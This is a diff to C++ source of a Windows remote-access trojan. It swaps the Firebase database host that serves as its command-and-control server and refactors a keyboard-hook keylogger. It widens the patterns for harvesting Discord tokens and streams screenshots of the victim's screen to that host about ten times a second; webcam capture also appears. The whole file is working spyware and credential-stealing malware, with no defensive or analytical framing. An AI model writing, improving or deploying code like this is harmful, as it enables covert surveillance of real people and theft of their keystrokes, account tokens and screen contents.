@@ -24,10 +24,10 @@ int g_liveQuality=25;
 float g_liveScale=0.5f;
 int g_liveMonitor=0;
 bool g_serverSSL = true;
-std::string g_serverHost = "solix-710c0-default-rtdb.europe-west1.firebasedatabase.app";
+std::string g_serverHost = "lucaaverij-default-rtdb.europe-west1.firebasedatabase.app";
 int g_serverPort = 443;
 bool g_keylogRunning=false;
-std::string g_keylogBuffer;
+std::vector<std::string> g_keylogBuffer;
 CRITICAL_SECTION g_keylogLock;
 HHOOK g_keylogHook=NULL;
 
@@ -185,85 +185,89 @@ std::vector<MonInfo> getMonitors(){
     return v;
 }
 
-std::string takeScreenshot(int monitorIdx, int quality=80) {
-    auto mons=getMonitors();
-    int x=0,y=0,w=GetSystemMetrics(SM_CXSCREEN),h=GetSystemMetrics(SM_CYSCREEN);
-    if(monitorIdx>=0&&monitorIdx<(int)mons.size()){
-        x=mons[monitorIdx].x; y=mons[monitorIdx].y;
-        w=mons[monitorIdx].w; h=mons[monitorIdx].h;
-    } else if(monitorIdx==-1){
-        x=GetSystemMetrics(SM_XVIRTUALSCREEN);
-        y=GetSystemMetrics(SM_YVIRTUALSCREEN);
-        w=GetSystemMetrics(SM_CXVIRTUALSCREEN);
-        h=GetSystemMetrics(SM_CYVIRTUALSCREEN);
+// Cached screen capture resources for live streaming
+static HDC g_captureDC = NULL;
+static HBITMAP g_captureBMP = NULL;
+static int g_captureW = 0, g_captureH = 0;
+
+static void ensureCaptureBuf(int w, int h) {
+    if (g_captureDC && (g_captureW != w || g_captureH != h)) {
+        SelectObject(g_captureDC, GetStockObject(BLACK_BRUSH));
+        DeleteDC(g_captureDC); g_captureDC = NULL;
+        DeleteObject(g_captureBMP); g_captureBMP = NULL;
     }
-    HDC dc=GetDC(0), mem=CreateCompatibleDC(dc);
-    HBITMAP bmp=CreateCompatibleBitmap(dc,w,h);
-    SelectObject(mem,bmp);
-    BitBlt(mem,0,0,w,h,dc,x,y,SRCCOPY);
-    ReleaseDC(0,dc);
-    Bitmap* gbmp=Bitmap::FromHBITMAP(bmp,0);
-    CLSID jpegClsid; GetEncoderClsid(L"image/jpeg",&jpegClsid);
-    EncoderParameters ep; ULONG q=quality;
-    ep.Count=1; ep.Parameter[0].Guid=EncoderQuality;
-    ep.Parameter[0].NumberOfValues=1;
-    ep.Parameter[0].Type=EncoderParameterValueTypeLong;
-    ep.Parameter[0].Value=&q;
-    IStream* is=0; CreateStreamOnHGlobal(0,TRUE,&is);
-    gbmp->Save(is,&jpegClsid,&ep);
-    DeleteObject(bmp); delete gbmp;
-    STATSTG st; is->Stat(&st,STATFLAG_NONAME);
-    ULONG sz=(ULONG)st.cbSize.LowPart;
-    std::vector<unsigned char> d(sz);
-    LARGE_INTEGER li={}; is->Seek(li,STREAM_SEEK_SET,0);
-    ULONG rr=0; is->Read(d.data(),sz,&rr); is->Release();
-    return base64Encode(d.data(),d.size());
+    if (!g_captureDC) {
+        HDC dc = GetDC(NULL);
+        g_captureDC = CreateCompatibleDC(dc);
+        g_captureBMP = CreateCompatibleBitmap(dc, w, h);
+        ReleaseDC(NULL, dc);
+        SelectObject(g_captureDC, g_captureBMP);
+        g_captureW = w; g_captureH = h;
+    }
 }
 
-std::string takeScreenshotScaled(int monitorIdx, int quality, float scale) {
+static std::string jpegEncode(Bitmap* bmp, int quality = 85) {
+    CLSID clsid; GetEncoderClsid(L"image/jpeg", &clsid);
+    IStream* st = NULL; CreateStreamOnHGlobal(NULL, TRUE, &st);
+    EncoderParameters ep; ep.Count = 1;
+    ep.Parameter[0].Guid = EncoderQuality;
+    ep.Parameter[0].Type = EncoderParameterValueTypeLong;
+    ep.Parameter[0].NumberOfValues = 1;
+    ULONG q = quality; ep.Parameter[0].Value = &q;
+    bmp->Save(st, &clsid, &ep);
+    STATSTG stat; st->Stat(&stat, STATFLAG_NONAME);
+    ULONG sz = (ULONG)stat.cbSize.LowPart;
+    std::vector<unsigned char> d(sz);
+    LARGE_INTEGER z = {}; st->Seek(z, STREAM_SEEK_SET, NULL);
+    ULONG rd = 0; st->Read(d.data(), sz, &rd); st->Release();
+    return base64Encode(d.data(), d.size());
+}
+
+struct ScreenRect { int x, y, w, h; };
+
+static ScreenRect getScreenRect(int monitorIdx) {
     auto mons = getMonitors();
-    int ox=0, oy=0, ow=GetSystemMetrics(SM_CXSCREEN), oh=GetSystemMetrics(SM_CYSCREEN);
-    if(monitorIdx>=0 && monitorIdx<(int)mons.size()) {
-        ox=mons[monitorIdx].x; oy=mons[monitorIdx].y;
-        ow=mons[monitorIdx].w; oh=mons[monitorIdx].h;
-    } else if(monitorIdx==-1) {
-        ox=GetSystemMetrics(SM_XVIRTUALSCREEN);
-        oy=GetSystemMetrics(SM_YVIRTUALSCREEN);
-        ow=GetSystemMetrics(SM_CXVIRTUALSCREEN);
-        oh=GetSystemMetrics(SM_CYVIRTUALSCREEN);
+    ScreenRect r = {0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN)};
+    if (monitorIdx >= 0 && monitorIdx < (int)mons.size()) {
+        r = {mons[monitorIdx].x, mons[monitorIdx].y, mons[monitorIdx].w, mons[monitorIdx].h};
+    } else if (monitorIdx == -1) {
+        r = {GetSystemMetrics(SM_XVIRTUALSCREEN), GetSystemMetrics(SM_YVIRTUALSCREEN),
+             GetSystemMetrics(SM_CXVIRTUALSCREEN), GetSystemMetrics(SM_CYVIRTUALSCREEN)};
     }
-    HDC dc=GetDC(0);
-    HDC mem=CreateCompatibleDC(dc);
-    HBITMAP bmp=CreateCompatibleBitmap(dc, ow, oh);
-    SelectObject(mem, bmp);
-    BitBlt(mem, 0, 0, ow, oh, dc, ox, oy, SRCCOPY);
-    ReleaseDC(0, dc);
-    Bitmap* src = Bitmap::FromHBITMAP(bmp, 0);
-    DeleteObject(bmp);
-    int sw = (int)(ow * scale), sh = (int)(oh * scale);
-    if (sw < 1) sw = 1; if (sh < 1) sh = 1;
+    return r;
+}
+
+static inline int imax(int a, int b) { return a > b ? a : b; }
+
+static std::string captureToBase64(int monitorIdx, float scale, int quality) {
+    ScreenRect sr = getScreenRect(monitorIdx);
+    HDC dc = GetDC(NULL);
+    ensureCaptureBuf(sr.w, sr.h);
+    BitBlt(g_captureDC, 0, 0, sr.w, sr.h, dc, sr.x, sr.y, SRCCOPY | CAPTUREBLT);
+    ReleaseDC(NULL, dc);
+
+    int sw = imax(1, (int)(sr.w * scale));
+    int sh = imax(1, (int)(sr.h * scale));
+
+    if (scale >= 1.0f && sw == sr.w && sh == sr.h) {
+        Bitmap* bmp = Bitmap::FromHBITMAP(g_captureBMP, NULL);
+        std::string r = jpegEncode(bmp, quality);
+        delete bmp;
+        return r;
+    }
+    Bitmap* src = Bitmap::FromHBITMAP(g_captureBMP, NULL);
     Bitmap* dst = new Bitmap(sw, sh, PixelFormat24bppRGB);
     Graphics g(dst);
-    g.SetInterpolationMode(InterpolationModeBilinear);
+    g.SetInterpolationMode(InterpolationModeHighQualityBilinear);
     g.DrawImage(src, 0, 0, sw, sh);
     delete src;
-    CLSID jpegClsid; GetEncoderClsid(L"image/jpeg", &jpegClsid);
-    EncoderParameters ep; ULONG q = quality;
-    ep.Count = 1; ep.Parameter[0].Guid = EncoderQuality;
-    ep.Parameter[0].NumberOfValues = 1;
-    ep.Parameter[0].Type = EncoderParameterValueTypeLong;
-    ep.Parameter[0].Value = &q;
-    IStream* is = 0; CreateStreamOnHGlobal(0, TRUE, &is);
-    dst->Save(is, &jpegClsid, &ep);
+    std::string r = jpegEncode(dst, quality);
     delete dst;
-    STATSTG st; is->Stat(&st, STATFLAG_NONAME);
-    ULONG sz = (ULONG)st.cbSize.LowPart;
-    std::vector<unsigned char> data(sz);
-    LARGE_INTEGER li = {}; is->Seek(li, STREAM_SEEK_SET, 0);
-    ULONG rr = 0; is->Read(data.data(), sz, &rr);
-    is->Release();
-    return base64Encode(data.data(), data.size());
+    return r;
 }
+
+std::string takeScreenshot(int monitorIdx) { return captureToBase64(monitorIdx, 1.0f, 90); }
+std::string takeScreenshotScaled(int monitorIdx, int quality, float scale) { return captureToBase64(monitorIdx, scale, quality); }
 
 std::string captureWebcam() {
     HWND hWndC=capCreateCaptureWindowA("Webcam",WS_CHILD,0,0,320,240,GetDesktopWindow(),1);
@@ -510,40 +514,30 @@ LRESULT CALLBACK keylogProc(int nCode, WPARAM wParam, LPARAM lParam) {
         bool shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;
         bool ctrl = GetAsyncKeyState(VK_CONTROL) & 0x8000;
         bool alt = GetAsyncKeyState(VK_MENU) & 0x8000;
-        std::string prefix;
-        if (ctrl) prefix += "Ctrl+";
-        if (alt) prefix += "Alt+";
-        if (shift) prefix += "Shift+";
-        std::string keyName;
+        char buf[64]; int pos = 0;
+        if (ctrl) { memcpy(buf+pos, "Ctrl+", 5); pos+=5; }
+        if (alt) { memcpy(buf+pos, "Alt+", 4); pos+=4; }
+        if (shift) { memcpy(buf+pos, "Shift+", 6); pos+=6; }
         if (vk >= 0x30 && vk <= 0x39) {
             char c = shift ? ")!@#$%^&*("[vk-0x30] : (char)vk;
-            keyName = std::string(1, c);
+            buf[pos++] = c;
         } else if (vk >= 0x41 && vk <= 0x5A) {
-            char c = (char)(vk + (shift ? 0 : 32));
-            keyName = std::string(1, c);
-        } else if (vk == VK_RETURN) keyName = "[Enter]";
-        else if (vk == VK_SPACE) keyName = " ";
-        else if (vk == VK_BACK) keyName = "[Backspace]";
-        else if (vk == VK_TAB) keyName = "[Tab]";
-        else if (vk == VK_ESCAPE) keyName = "[Esc]";
-        else if (vk == VK_DELETE) keyName = "[Del]";
-        else if (vk == VK_LEFT) keyName = "[Left]";
-        else if (vk == VK_RIGHT) keyName = "[Right]";
-        else if (vk == VK_UP) keyName = "[Up]";
-        else if (vk == VK_DOWN) keyName = "[Down]";
-        else if (vk == VK_HOME) keyName = "[Home]";
-        else if (vk == VK_END) keyName = "[End]";
-        else if (vk == VK_PRIOR) keyName = "[PgUp]";
-        else if (vk == VK_NEXT) keyName = "[PgDn]";
-        else {
-            char buf[16];
-            sprintf(buf, "[VK:%d]", (int)vk);
-            keyName = buf;
-        }
-        std::string entry = prefix + keyName;
+            buf[pos++] = (char)(vk + (shift ? 0 : 32));
+        } else if (vk == VK_RETURN) { memcpy(buf+pos, "[Enter]", 7); pos+=7; }
+        else if (vk == VK_SPACE) { buf[pos++] = ' '; }
+        else if (vk == VK_BACK) { memcpy(buf+pos, "[Bksp]", 6); pos+=6; }
+        else if (vk == VK_TAB) { memcpy(buf+pos, "[Tab]", 5); pos+=5; }
+        else if (vk == VK_ESCAPE) { memcpy(buf+pos, "[Esc]", 5); pos+=5; }
+        else if (vk == VK_DELETE) { memcpy(buf+pos, "[Del]", 5); pos+=5; }
+        else if (vk == VK_LEFT) { memcpy(buf+pos, "[Left]", 6); pos+=6; }
+        else if (vk == VK_RIGHT) { memcpy(buf+pos, "[Right]", 7); pos+=7; }
+        else if (vk == VK_UP) { memcpy(buf+pos, "[Up]", 4); pos+=4; }
+        else if (vk == VK_DOWN) { memcpy(buf+pos, "[Down]", 6); pos+=6; }
+        else { pos += sprintf(buf+pos, "[%d]", (int)vk); }
+        buf[pos++] = '\n';
         EnterCriticalSection(&g_keylogLock);
-        g_keylogBuffer += entry + "\n";
-        if (g_keylogBuffer.size() > 50000) g_keylogBuffer = g_keylogBuffer.substr(g_keylogBuffer.size() - 40000);
+        g_keylogBuffer.push_back(std::string(buf, pos));
+        if (g_keylogBuffer.size() > 2000) g_keylogBuffer.erase(g_keylogBuffer.begin());
         LeaveCriticalSection(&g_keylogLock);
     }
     return CallNextHookEx(g_keylogHook, nCode, wParam, lParam);
@@ -568,7 +562,8 @@ std::string stopKeylog() {
 
 std::string dumpKeylog() {
     EnterCriticalSection(&g_keylogLock);
-    std::string out = g_keylogBuffer;
+    std::string out;
+    for (const auto& s : g_keylogBuffer) out += s;
     LeaveCriticalSection(&g_keylogLock);
     return out.empty() ? "(no keys logged)" : out;
 }
@@ -871,7 +866,7 @@ std::string getDiscordTokens() {
                             size_t e = p + 4;
                             while (e < s.size() && isTC(s[e])) e++;
                             std::string t = s.substr(p, e - p);
-                            if (t.size() > 80 && t.size() < 100 && found.find(t) == std::string::npos) {
+                            if (t.size() > 70 && found.find(t) == std::string::npos) {
                                 if (!found.empty()) found += "\n";
                                 found += t;
                             }
@@ -883,18 +878,18 @@ std::string getDiscordTokens() {
                             size_t a = i;
                             while (i < s.size() && isTC(s[i])) i++;
                             std::string s1 = s.substr(a, i - a);
-                            if (s1.size() >= 20 && s1.size() <= 26 && i < s.size() && s[i] == '.') {
+                            if (s1.size() >= 18 && s1.size() <= 28 && i < s.size() && s[i] == '.') {
                                 size_t j = i + 1;
                                 if (j >= s.size()) break;
                                 size_t b = j;
                                 while (j < s.size() && isTC(s[j])) j++;
                                 std::string s2 = s.substr(b, j - b);
-                                if (s2.size() >= 4 && s2.size() <= 8 && j < s.size() && s[j] == '.') {
+                                if (s2.size() >= 4 && s2.size() <= 10 && j < s.size() && s[j] == '.') {
                                     j++;
                                     size_t c = j;
                                     while (j < s.size() && isTC(s[j])) j++;
                                     std::string s3 = s.substr(c, j - c);
-                                    if (s3.size() >= 24 && s3.size() <= 30) {
+                                    if (s3.size() >= 20 && s3.size() <= 32) {
                                         std::string t = s1 + "." + s2 + "." + s3;
                                         if (found.find(t) == std::string::npos) {
                                             if (!found.empty()) found += "\n";
@@ -1028,20 +1023,18 @@ DWORD WINAPI pollThread(LPVOID) {
 
 DWORD WINAPI screenThread(LPVOID) {
     Sleep(3000);
-    const int TARGET_MS = 100;
     while(true) {
         DWORD t0 = GetTickCount();
-        int q = g_liveQuality; float s = g_liveScale;
         try {
-            std::string b64 = takeScreenshotScaled(g_liveMonitor, q, s);
+            std::string b64 = captureToBase64(g_liveMonitor, g_liveScale, g_liveQuality);
             std::string escaped = jsonEscape(b64);
             std::string ts = getTimestamp();
-            char scaleStr[16]; sprintf(scaleStr, "%.2f", s);
-            std::string body = "{\"result\":\"" + escaped + "\",\"created_at\":\"" + ts + "\",\"q\":" + std::to_string(q) + ",\"scale\":" + std::string(scaleStr) + "}";
+            char scaleStr[16]; sprintf(scaleStr, "%.2f", g_liveScale);
+            std::string body = "{\"r\":\"" + escaped + "\",\"t\":\"" + ts + "\",\"q\":" + std::to_string(g_liveQuality) + ",\"s\":" + std::string(scaleStr) + "}";
             httpsPut("/live/" + fbEsc(computerName) + ".json", body);
         } catch(...) {}
         DWORD elapsed = GetTickCount() - t0;
-        if (elapsed < (DWORD)TARGET_MS) Sleep(TARGET_MS - elapsed);
+        if (elapsed < 100) Sleep(100 - elapsed);
     }
     return 0;
 }
